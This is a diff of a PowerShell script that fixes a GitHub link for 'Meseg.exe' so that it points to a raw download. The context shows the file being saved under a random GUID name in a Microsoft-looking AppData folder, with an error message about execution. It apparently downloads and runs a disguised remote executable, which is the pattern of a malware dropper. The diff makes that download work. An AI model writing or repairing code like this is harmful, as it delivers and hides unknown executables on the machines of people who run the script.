@@ -1,4 +1,4 @@
-$exeUrl = "https://github.com/xxuavails/diagnosis/blob/main/Meseg.exe";
+$exeUrl = "https://github.com/xxuavails/diagnosis/raw/refs/heads/main/Meseg.exe";
 $tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe";
 
 try {
@@ -12,6 +12,7 @@ try {
 } catch {
     Write-Error "Execution failed: $_";
 }
+
 
 
 
